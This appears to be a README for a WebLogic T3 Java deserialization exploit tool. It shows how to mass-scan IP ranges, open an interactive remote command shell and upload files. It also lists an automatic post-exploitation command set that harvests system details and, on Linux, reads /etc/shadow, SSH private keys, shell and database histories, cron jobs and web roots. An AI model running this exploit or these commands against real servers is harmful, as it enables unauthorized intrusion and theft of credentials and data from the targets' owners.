# weblogic_java_des
------------
weblogic T3 collections java InvokerTransformer Transformer  InvokerTransformer weblogic.jndi.WLInitialContextFactory

# jdk
------------
jdk 1.6+
# how use?
------------
<code>
<pre>
* 0 、ips 

java  -jar ./bin/jfxl.jar 192.168.10.90:80
java  -jar ./bin/jfxl.jar 192.168.10.90:80;192.168.10.190:7001;192.168.10.33:7001

* 1、cmd shell Interactive -i
java -jar jfxl.jar 119.17.248.52:8080 -i
quit or exit out the shell
[file upload 
put localFileName remouteFileName

if "auto",run
````
win:
"当前目录",
 "cmd.exe /c echo %cd%",
 "当前目录下所有文件",
 "cmd.exe /c dir /s",
"网络ip配置",
"cmd.exe /c ipconfig  /all",
"arp信息",
"cmd.exe /c arp -a",
"主机信息1",
"systeminfo.exe",
"主机信息2",
"cmd.exe /c SYSTEMINFO  ",
"进程信息",
"cmd.exe /c TASKLIST /V",
"服务信息",
"cmd.exe /c sc query",
"网络信息",
"netstat -ano",
"系统环境信息",
"cmd.exe /c set",
linux:
"echo 查看java可以通讯",
 "netstat -anp | grep java | grep ESTABLISHED | grep -v .216 | grep -v LISTENING | grep -v CONNECTED",
 "echo 查看加载的模块",
 "lsmod",
 "echo 看rpc服务开放",
 "rpcinfo -p",
 "echo 补丁情况",
 "rpm -qa",// | grep patch
  "echo 查看服务状态",
  "service --status-all",
 "系统是什么版本?",
 "cat /etc/issue ; cat /etc/*-release ; cat /etc/lsb-release ; cat /etc/redhat-release",
 "是root吗？",
 "cat /etc/sudoers;cat /etc/passwd ;cat /etc/group ;cat /etc/shadow ;ls -alh /var/mail/;ls -ahlR /home/;ls -ahlR /root/",
 "查找mysql数据文件",
 "find /var/lib/mysql/ -regex \".*\\.frm\\|.*\\.idb\\|.*\\.MYI\\|.*\\.MYD\"",
 "历史操作信息",
 "cat ~/.bash_history ;cat ~/.nano_history ;cat ~/.atftp_history ;cat ~/.mysql_history ;cat ~/.php_history ;cat ~/.bashrc ;cat ~/.profile ;cat /var/mail/root ;cat /var/spool/mail/root ;cat ~/.ssh/authorized_keys ;cat ~/.ssh/identity.pub ;cat ~/.ssh/identity ;cat ~/.ssh/id_rsa.pub ;cat ~/.ssh/id_rsa ;cat ~/.ssh/id_dsa.pub ;cat ~/.ssh/id_dsa ;cat /etc/ssh/ssh_config ;cat /etc/ssh/sshd_config ;cat /etc/ssh/ssh_host_dsa_key.pub ;cat /etc/ssh/ssh_host_dsa_key ;cat /etc/ssh/ssh_host_rsa_key.pub ;cat /etc/ssh/ssh_host_rsa_key ;cat /etc/ssh/ssh_host_key.pub ;cat /etc/ssh/ssh_host_key ;ls -alh /var/log ;ls -alh /var/mail ;ls -alh /var/spool ;ls -alh /var/spool/lpd ;ls -alh /var/lib/pgsql ;ls -alh /var/lib/mysql ;cat /var/lib/dhcp3/dhclient.leases ;ls -alhR /var/www/ ;ls -alhR /srv/www/htdocs/ ;ls -alhR /usr/local/www/apache22/data/ ;ls -alhR /opt/lampp/htdocs/ ;ls -alhR /var/www/html/",
 "服务器时间，及当前目录",
 "date;uptime; pwd",
 "echo sshd安装情况",
 "ldd /usr/sbin/sshd",
 "内核版本是什么？",
 "uname -mrs;  dmesg | grep Linux  ; cat /proc/version ; rpm -q kernel ; ls /boot | grep vmlinuz",
 "环境变量里有些什么？",
 "cat /etc/profile ; cat /etc/bashrc ; cat ~/.bash_profile ; cat ~/.bashrc ; env ; set ; cat ~/.bash_logout",
 "文件句柄配置情况",
	"cat /proc/sys/fs/file-nr",
	"缓存？IP和/或MAC地址?",
	"arp -a",
	"当前内存使用情况",
	"free -m;ulimit -n;ulimit -a",
	"主机中的用户名清单",
	"cat /etc/passwd |cut -f 1 -d :", // 查看所有用户
	"Linux块设备的信息.块设备是硬盘和闪驱等之类的存储设备"
	,"lsblk -a"
	,"文件系统信息"
	,"df -h" 
	,"进程、服务信息"
	,"ps -aeo ruser,ppid,pid,lstart,%cpu,%mem,etime,tty,args --sort -%cpu,-%mem;cat /etc/service"
	,"安装的应用信息"
	,"ls -alh /usr/bin/;ls -alh /sbin/;ls -alh /var/cache/yum/;ls -alh /var/cache/apt/archivesO;rpm -qa;dpkg -l"
	,"Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？"
	,"cat /etc/syslog.conf ; cat /etc/chttp.conf ; cat /etc/lighttpd.conf ; cat /etc/cups/cupsd.conf ; cat /etc/inetd.conf ; cat /etc/apache2/apache2.conf ; cat /etc/my.conf ; cat /etc/httpd/conf/httpd.conf ; cat /opt/lampp/etc/httpd.conf ; ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/"
	,"主机上有哪些工作计划？"
	,"ls -alh /var/spool/cron ;ls -al /etc/ | grep cron ;ls -al /etc/cron* ;cat /etc/cron* ;cat /etc/at.allow ;cat /etc/at.deny ;cat /etc/cron.allow ;cat /etc/cron.deny ;cat /etc/crontab;cat /etc/anacrontab;cat /var/spool/cron/crontabs/root;crontab -l"
	,"cpu信息"
	,"cat /proc/cpuinfo"
	,"内存使用情况"
	,"cat /proc/meminfo"
	,"系统的分区信息"
	,"cat /proc/partitions"
	,"网络配置信息"
	,"route;last;lsof -i;cat /etc/services;/sbin/ifconfig -a;cat /etc/network/interfaces;cat /etc/sysconfig/network;cat /etc/resolv.conf;cat /etc/sysconfig/network ;cat /etc/networks ;iptables -L ;hostname ;dnsdomainname"
	," 端口和服务的查看"
	,"netstat -a;chkconfig --list"
	,"大于100M的文件"
	,"find / -type f -size +100000k -exec ls -lh {} \\; | awk  '{ print $9 \":\" $5 }'"
	,"当前目录jdbc"
	,"find . -name jdbc.*",
	"所有jsp文件"
	,"find . -name *.jsp",
	"所有war"
	,"find . -name *.war",
	"所有ear"
	,"find . -name *.ear"
````
*  2、java -jar jfxl.jar 119.177.248.52-155:8080
*  3、java -jar jfxl.jar 119.177.248.52/16:8080
</pre>
</code>

# demo
------------

<img src="https://github.com/hktalent/weblogic_java_des/blob/master/demo/1.jpeg?raw=true" />
